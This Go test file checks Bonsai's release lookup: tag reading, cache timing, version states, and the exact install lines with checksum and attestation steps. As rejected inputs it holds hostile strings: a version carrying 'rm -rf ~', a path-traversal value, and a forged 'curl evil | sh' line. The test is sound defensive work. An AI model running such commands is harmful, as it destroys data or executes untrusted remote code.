package engine

// Bonsai's newer releases (release.go, plan-5 5.6.5): read from a local repository with tags through a stamped
// source (no test reaches GitHub), the record's times faked; no read within a day of one that worked, nor within an
// hour of one that failed; the states; the lines' exact text, their origin check's place (5.7.3) and their names held
// to .goreleaser.yaml; a forged record giving no lines; check's warning and note.

import (
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/LastStep/Bonsai/internal/testpack"
)

// fakeClock makes releaseNow give the time *at for this test.
func fakeClock(t *testing.T, at *time.Time) {
	t.Helper()
	old := releaseNow
	releaseNow = func() time.Time { return *at }
	t.Cleanup(func() { releaseNow = old })
}

// tagged makes a bare repository holding one commit and tags, as Bonsai's public repository holds its tags.
func tagged(t *testing.T, tags ...string) string {
	t.Helper()
	dir := t.TempDir()
	work := filepath.Join(dir, "work")
	testpack.Git(t, dir, "init", "-q", "work")
	if err := os.WriteFile(filepath.Join(work, "README.md"), []byte("bonsai\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	testpack.Git(t, work, "add", "README.md")
	testpack.Git(t, work, "-c", "user.name=test", "-c", "user.email=test@example.org", "commit", "-q", "-m", "one")
	for _, tag := range tags {
		testpack.Git(t, work, "tag", tag)
	}
	bare := filepath.Join(dir, "bonsai.git")
	testpack.Git(t, dir, "clone", "-q", "--bare", "--", work, bare)
	return bare
}

// stampSource makes this test a stamped build whose release read names source.
func stampSource(t *testing.T, source string) {
	t.Helper()
	stampAs(t, "/scratch/bonsai", t.TempDir())
	old := releaseSource
	releaseSource = source
	t.Cleanup(func() { releaseSource = old })
}

// noRead is a tags reader that fails the test: no read may be made.
func noRead(t *testing.T) func(string, time.Duration) ([]string, error) {
	return func(string, time.Duration) ([]string, error) {
		t.Error("a release read was made when none was due")
		return nil, errors.New("not due")
	}
}

func TestNewestRelease(t *testing.T) {
	tags := []string{"v0.4.3", "base-v2.0.0", "v1.0.0", "v1.9.0", "v1.10.0-rc.1", "v2.0", "1.5.0", "v1.2.0x", "vv1.3.0", "v1.0.1"}
	if got := NewestRelease(tags); got != "1.9.0" {
		t.Errorf("NewestRelease = %q, want 1.9.0 (v1.10.0-rc.1, base-v2.0.0, v2.0, 1.5.0 and v0.4.3 do not count)", got)
	}
	if got := NewestRelease([]string{"v0.4.3", "v0.9.9", "base-v1.0.0"}); got != "" {
		t.Errorf("NewestRelease of the old product's and a pack's tags = %q, want none", got)
	}
	for _, v := range []string{"1.0.1; rm -rf ~", "1.0", "1.0.0-rc.1", " 1.0.0", "1.0.0\n", "v1.0.0", "1.0.0.0", "1234567890.0.0", ""} {
		if _, ok := PlainVersion(v); ok {
			t.Errorf("PlainVersion(%q) took it as three whole numbers", v)
		}
	}
}

// A plain build reads Bonsai's own repository; the source stamp counts only in a stamped build.
func TestReleaseSourcePlainAndStamped(t *testing.T) {
	if releaseSource != "" || ReleaseFrom() != ReleaseSource {
		t.Fatalf("a plain build's release source is %q (stamp %q), want %s and an empty stamp", ReleaseFrom(), releaseSource, ReleaseSource)
	}
	old := releaseSource
	releaseSource = "/somewhere/else.git"
	t.Cleanup(func() { releaseSource = old })
	if ReleaseFrom() != ReleaseSource {
		t.Errorf("a source stamp alone, in a build with no other stamp, was honoured: %s", ReleaseFrom())
	}
}

func TestReleaseReadAndItsTimes(t *testing.T) {
	bare := tagged(t, "v0.4.3", "base-v2.0.0", "v1.0.0", "v1.0.1", "v1.1.0-rc.1")
	stampSource(t, bare)
	home := t.TempDir()
	now := time.Date(2026, 11, 2, 8, 15, 0, 0, time.UTC)
	fakeClock(t, &now)
	rr := RefreshRelease(home, RemoteTags)
	if !rr.Read || rr.NotKept != nil || rr.Record == nil || rr.Record.Newest == nil || *rr.Record.Newest != "1.0.1" {
		t.Fatalf("the first read: %+v (record %+v)", rr, rr.Record)
	}
	raw, err := os.ReadFile(filepath.Join(home, "cache", "release.json"))
	if err != nil {
		t.Fatal(err)
	}
	want := "{\n  \"newest\": \"1.0.1\",\n  \"read\": \"2026-11-02T08:15:00Z\",\n  \"source\": " + mustJSON(t, bare) + ",\n  \"failed\": null\n}\n"
	if string(raw) != want {
		t.Errorf("cache/release.json:\n%s\nwant:\n%s", raw, want)
	}
	// Within a day, nothing is read; at a day, it is.
	now = now.Add(23*time.Hour + 59*time.Minute)
	if rr := RefreshRelease(home, noRead(t)); rr.Read || *rr.Record.Newest != "1.0.1" {
		t.Errorf("a read within the day: %+v", rr)
	}
	now = now.Add(time.Minute)
	read := false
	rr = RefreshRelease(home, func(source string, timeout time.Duration) ([]string, error) {
		read = true
		if source != bare || timeout != 10*time.Second {
			t.Errorf("the read named %s with %s, want the stamped source with 10s", source, timeout)
		}
		return nil, errors.New("git ls-remote failed: could not resolve host")
	})
	if !read || !rr.Read {
		t.Fatalf("no read a day after the last that worked")
	}
	// A read that failed keeps the last that worked and records the failure: unknown, with when and why.
	s := LoadRelease(home).State(home, "1.0.0")
	if s.State != ReleaseUnknown || s.Why == nil || !strings.Contains(*s.Why, "at 2026-11-03T08:15:00Z, failed: git ls-remote failed: could not resolve host") ||
		s.Newest == nil || *s.Newest != "1.0.1" || s.Lines != nil || *s.Read != "2026-11-02T08:15:00Z" {
		t.Errorf("after a failed read: %+v", s)
	}
	// Within the hour after a failure, nothing is read; at the hour, it is.
	now = now.Add(59 * time.Minute)
	if rr := RefreshRelease(home, noRead(t)); rr.Read {
		t.Errorf("a read within the hour after a failure")
	}
	now = now.Add(time.Minute)
	rr = RefreshRelease(home, RemoteTags)
	if !rr.Read || rr.Record.Failed != nil || *rr.Record.Read != "2026-11-03T09:15:00Z" {
		t.Errorf("the read an hour after the failure: %+v", rr.Record)
	}
	// A record of another source (another build on this home) is read again at once.
	releaseSource = tagged(t, "v1.2.0")
	if rr := RefreshRelease(home, RemoteTags); !rr.Read || *rr.Record.Newest != "1.2.0" {
		t.Errorf("a record of another source was not read again: %+v", rr.Record)
	}
}

func mustJSON(t *testing.T, s string) string {
	raw, err := json.Marshal(s)
	if err != nil {
		t.Fatal(err)
	}
	return string(raw)
}

// A home that cannot be written never fails the read: its answer is given, NotKept says why.
func TestReleaseNotKept(t *testing.T) {
	home := t.TempDir()
	if err := os.WriteFile(filepath.Join(home, "cache"), []byte("a file where the folder goes"), 0o644); err != nil {
		t.Fatal(err)
	}
	rr := RefreshRelease(home, func(string, time.Duration) ([]string, error) { return []string{"v1.0.1"}, nil })
	if !rr.Read || rr.NotKept == nil || rr.Record == nil || *rr.Record.Newest != "1.0.1" {
		t.Errorf("a home that cannot be written: %+v", rr)
	}
	if s := rr.State(home, "1.0.0"); s.State != ReleaseNewer || s.Lines == nil {
		t.Errorf("the answer not kept was not given: %+v", s)
	}
}

// writeRecord writes the home's record as given.
func writeRecord(t *testing.T, home, raw string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Join(home, "cache"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(home, "cache", "release.json"), []byte(raw), 0o644); err != nil {
		t.Fatal(err)
	}
}

const recordOf101 = `{"newest": "1.0.1", "read": "2026-11-02T08:15:00Z", "source": "` + ReleaseSource + `", "failed": null}`

func TestReleaseStates(t *testing.T) {
	home := t.TempDir()
	s := LoadRelease(home).State(home, "1.0.0")
	if s.State != ReleaseUnknown || s.Why == nil || !strings.Contains(*s.Why, "have not been read on this machine yet: bonsai status --full reads them") ||
		s.Read != nil || s.Newest != nil || s.Lines != nil || *s.Version != "1.0.0" {
		t.Errorf("never read: %+v", s)
	}
	writeRecord(t, home, recordOf101)
	cases := []struct{ version, state string }{
		{"1.0.0", ReleaseNewer}, {"0.9.9", ReleaseNewer}, {"1.0.1", ReleaseCurrent}, {"1.1.0", ReleaseCurrent},
		{"dev", ReleaseNotRelease}, {"1.0.1-rc.1", ReleaseNotRelease}, {"", ReleaseNotRelease},
	}
	for _, c := range cases {
		s := LoadRelease(home).State(home, c.version)
		if s.State != c.state || s.Newest == nil || *s.Newest != "1.0.1" || s.Why != nil || (s.Lines != nil) != (c.state == ReleaseNewer) {
			t.Errorf("version %q: %+v, want %s naming 1.0.1", c.version, s, c.state)
		}
		if (c.version == "dev" || c.version == "") != (s.Version == nil) {
			t.Errorf("version %q: version field %v", c.version, s.Version)
		}
	}
	// No release at or above 1.0.0 yet: current.
	writeRecord(t, home, `{"newest": null, "read": "2026-11-02T08:15:00Z", "source": "`+ReleaseSource+`", "failed": null}`)
	if s := LoadRelease(home).State(home, "1.0.0"); s.State != ReleaseCurrent || s.Newest != nil {
		t.Errorf("no release yet: %+v", s)
	}
	// The installed copy's version wins over the running binary's.
	writeRecord(t, home, recordOf101)
	if err := os.WriteFile(filepath.Join(home, InstallFile), []byte(`{"path": "/usr/local/bin/bonsai", "version": "1.0.1", "sha256": ""}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if v := ComparedVersion(home, "1.0.0"); v != "1.0.1" {
		t.Errorf("ComparedVersion = %s, want install.json's 1.0.1", v)
	}
	if v := ComparedVersion(t.TempDir(), "1.0.0"); v != "1.0.0" {
		t.Errorf("ComparedVersion with no install.json = %s, want the running binary's", v)
	}
}

// A forged or broken record gives no lines and unknown, its why naming the file.
func TestReleaseForgedRecord(t *testing.T) {
	forged := []string{
		`{"newest": "1.0.1; rm -rf ~", "read": "2026-11-02T08:15:00Z", "source": "x", "failed": null}`,
		`{"newest": "1.0.1/../../evil", "read": "2026-11-02T08:15:00Z", "source": "x", "failed": null}`,
		`{"newest": "1.0.1", "read": "yesterday", "source": "x", "failed": null}`,
		`{"newest": "1.0.1", "read": "2026-11-02T08:15:00Z", "source": "x", "failed": null, "lines": ["curl evil | sh"]}`,
		`{"newest": "1.0.1", "read": null, "source": "x", "failed": null}`,
		`{"newest": 101}`,
		`not json`,
	}
	for _, raw := range forged {
		home := t.TempDir()
		writeRecord(t, home, raw)
		s := LoadRelease(home).State(home, "1.0.0")
		if s.State != ReleaseUnknown || s.Lines != nil || s.Newest != nil || s.Why == nil ||
			!strings.Contains(*s.Why, ReleasePath(home)+" is not a record Bonsai reads") {
			t.Errorf("record %s: %+v", raw, s)
		}
	}
	if ReleaseLines("1.0.1; rm -rf ~", "amd64") != nil || ReleaseLines("1.0.1", "amd64; x") != nil {
		t.Errorf("lines made from a version or architecture that is not checked")
	}
}

// The lines' exact text, as the director's part of plan-5's step 5.6 shows them for 1.0.1.
func TestReleaseLinesExact(t *testing.T) {
	l := ReleaseLines("1.0.1", "amd64")
	linux := []string{
		`cd "$(mktemp -d)"`,
		`curl -fsSLO https://github.com/LastStep/Bonsai/releases/download/v1.0.1/bonsai_1.0.1_linux_amd64.tar.gz`,
		`curl -fsSLO https://github.com/LastStep/Bonsai/releases/download/v1.0.1/checksums.txt`,
		`sha256sum -c --ignore-missing checksums.txt`,
		`gh attestation verify bonsai_1.0.1_linux_amd64.tar.gz -R LastStep/Bonsai --signer-workflow LastStep/Bonsai/.github/workflows/release.yml --source-ref refs/tags/v1.0.1 --deny-self-hosted-runners`,
		`tar -xzf bonsai_1.0.1_linux_amd64.tar.gz`,
		`sh install.sh`,
	}
	windows := []string{
		`cd (New-Item -ItemType Directory (Join-Path $env:TEMP ("bonsai-" + [guid]::NewGuid())))`,
		`curl.exe -fsSLO https://github.com/LastStep/Bonsai/releases/download/v1.0.1/bonsai_1.0.1_windows_amd64.zip`,
		`curl.exe -fsSLO https://github.com/LastStep/Bonsai/releases/download/v1.0.1/checksums.txt`,
		`(Get-FileHash bonsai_1.0.1_windows_amd64.zip -Algorithm SHA256).Hash -eq ((Select-String -Path checksums.txt -SimpleMatch bonsai_1.0.1_windows_amd64.zip).Line -split ' ')[0]`,
		`gh attestation verify bonsai_1.0.1_windows_amd64.zip -R LastStep/Bonsai --signer-workflow LastStep/Bonsai/.github/workflows/release.yml --source-ref refs/tags/v1.0.1 --deny-self-hosted-runners`,
		`Expand-Archive bonsai_1.0.1_windows_amd64.zip -DestinationPath . -Force`,
		`powershell -NoProfile -ExecutionPolicy Bypass -File .\install.ps1`,
	}
	if l == nil || strings.Join(l.Linux, "\n") != strings.Join(linux, "\n") || strings.Join(l.Windows, "\n") != strings.Join(windows, "\n") {
		t.Fatalf("the lines:\n%s\n\n%s", strings.Join(l.Linux, "\n"), strings.Join(l.Windows, "\n"))
	}
	for _, line := range append(append([]string{}, l.Linux...), l.Windows...) {
		if strings.Contains(line, "&&") || strings.Contains(line, "\n") {
			t.Errorf("a line holds && or a line break: %s", line)
		}
		for _, url := range regexp.MustCompile(`https://\S+`).FindAllString(line, -1) {
			if !strings.HasPrefix(url, ReleaseDownload+"1.0.1/") {
				t.Errorf("a URL not under the fixed download address: %s", url)
			}
		}
	}
	if arm := ReleaseLines("2.3.4", "arm64"); !strings.HasSuffix(arm.Linux[1], "/v2.3.4/bonsai_2.3.4_linux_arm64.tar.gz") ||
		!strings.HasSuffix(arm.Windows[1], "/v2.3.4/bonsai_2.3.4_windows_arm64.zip") {
		t.Errorf("arm64's lines: %v %v", arm.Linux, arm.Windows)
	}
}

// The origin check (plan-5 note 5.7.3): on each side the fifth of seven lines, after the fingerprint and before
// unpacking, the same words on both sides but for the archive's name, its tag the checked version's and nothing else.
func TestReleaseLinesVerifyOrigin(t *testing.T) {
	for _, c := range []struct{ version, arch string }{{"1.0.1", "amd64"}, {"2.3.4", "arm64"}, {"10.20.30", "amd64"}} {
		l := ReleaseLines(c.version, c.arch)
		if l == nil || len(l.Linux) != 7 || len(l.Windows) != 7 {
			t.Fatalf("%s %s: not seven lines a side: %+v", c.version, c.arch, l)
		}
		for goos, lines := range map[string][]string{"linux": l.Linux, "windows": l.Windows} {
			archive := ReleaseArchive(c.version, goos, c.arch)
			want := "gh attestation verify " + archive + " -R LastStep/Bonsai --signer-workflow LastStep/Bonsai/.github/workflows/release.yml" +
				" --source-ref refs/tags/v" + c.version + " --deny-self-hosted-runners"
			if lines[4] != want {
				t.Errorf("%s %s %s: the fifth line is %q, want %q", c.version, c.arch, goos, lines[4], want)
			}
			for i, line := range lines {
				if i != 4 && strings.Contains(line, "attestation") {
					t.Errorf("%s %s %s: line %d also checks the origin: %s", c.version, c.arch, goos, i+1, line)
				}
			}
			if !strings.Contains(lines[3], "checksums.txt") || !strings.Contains(lines[5], archive) || strings.HasPrefix(lines[5], "gh ") {
				t.Errorf("%s %s %s: the origin check is not between the fingerprint and the unpacking: %q", c.version, c.arch, goos, lines)
			}
		}
		if strings.Replace(l.Linux[4], ReleaseArchive(c.version, "linux", c.arch), "X", 1) !=
			strings.Replace(l.Windows[4], ReleaseArchive(c.version, "windows", c.arch), "X", 1) {
			t.Errorf("%s %s: the two sides' origin checks differ beyond the archive: %q %q", c.version, c.arch, l.Linux[4], l.Windows[4])
		}
	}
}

// The lines' file names are the ones .goreleaser.yaml makes: its archives' and checksum's name templates, read as
// text, so a change there cannot leave the lines behind.
func TestReleaseNamesHeldToGoreleaser(t *testing.T) {
	raw, err := os.ReadFile(filepath.Join("..", "..", ".goreleaser.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	text := strings.ReplaceAll(string(raw), "\r\n", "\n")
	section := func(name string) string {
		m := regexp.MustCompile(`(?ms)^` + name + `:\n(.*?)(^\S|\z)`).FindStringSubmatch(text)
		if m == nil {
			t.Fatalf(".goreleaser.yaml has no %s section", name)
		}
		return m[1]
	}
	field := func(in, key string) string {
		m := regexp.MustCompile(`(?m)^\s*` + key + `:\s*"?([^"\n]*)"?\s*$`).FindStringSubmatch(in)
		if m == nil {
			t.Fatalf(".goreleaser.yaml has no %s in:\n%s", key, in)
		}
		return m[1]
	}
	project := field(text, "project_name")
	archives, checksum := section("archives"), section("checksum")
	if got := field(checksum, "name_template"); got != "checksums.txt" {
		t.Errorf("checksum's name_template is %q, the lines download checksums.txt", got)
	}
	for _, goos := range []string{"linux", "windows"} {
		for _, arch := range []string{"amd64", "arm64"} {
			name := strings.NewReplacer("{{ .ProjectName }}", project, "{{ .Version }}", "1.0.1", "{{ .Os }}", goos, "{{ .Arch }}", arch).
				Replace(field(archives, "name_template"))
			ext := ".tar.gz"
			if goos == "windows" {
				ext = ".zip"
			}
			if got := ReleaseArchive("1.0.1", goos, arch); got != name+ext {
				t.Errorf("the lines' archive %s, .goreleaser.yaml's %s%s", got, name, ext)
			}
		}
	}
	if !regexp.MustCompile(`(?m)^\s+formats:\n\s+- tar.gz$`).MatchString(archives) ||
		!regexp.MustCompile(`(?m)- goos: windows\n\s+formats:\n\s+- zip$`).MatchString(archives) {
		t.Errorf("the archives are not tar.gz, zip on Windows, as the lines unpack them:\n%s", archives)
	}
}

// check's word: the warning when a newer release is recorded, a note when the record is missing or old.
func TestCheckRelease(t *testing.T) {
	now := time.Date(2026, 11, 2, 9, 0, 0, 0, time.UTC)
	fakeClock(t, &now)
	home := t.TempDir()
	r := &CheckResult{Home: home, version: "1.0.0"}
	r.checkRelease()
	if len(r.Warnings) != 0 || len(r.Notes) != 1 || !strings.Contains(r.Notes[0], "bonsai status --full reads them") {
		t.Errorf("no record: %+v %v", r.Warnings, r.Notes)
	}
	writeRecord(t, home, recordOf101)
	r = &CheckResult{Home: home, version: "1.0.0"}
	r.checkRelease()
	if len(r.Warnings) != 1 || r.Warnings[0].Code != "bonsai-newer" || r.Warnings[0].Who != "person" || len(r.Notes) != 0 ||
		r.Warnings[0].Next != "a person installs Bonsai v1.0.1 on each side: the lines are in `bonsai status --full --json`, `bonsai_release.lines`" {
		t.Errorf("a newer release: %+v %v", r.Warnings, r.Notes)
	}
	r = &CheckResult{Home: home, version: "1.0.1"}
	r.checkRelease()
	if len(r.Warnings)+len(r.Notes) != 0 {
		t.Errorf("current: %+v %v", r.Warnings, r.Notes)
	}
	now = now.Add(7*24*time.Hour + time.Hour)
	r = &CheckResult{Home: home, version: "dev"}
	r.checkRelease()
	if len(r.Warnings) != 0 || len(r.Notes) != 1 || !strings.Contains(r.Notes[0], "over 7 days ago: bonsai status --full reads them again") {
		t.Errorf("an old record: %+v %v", r.Warnings, r.Notes)
	}
}
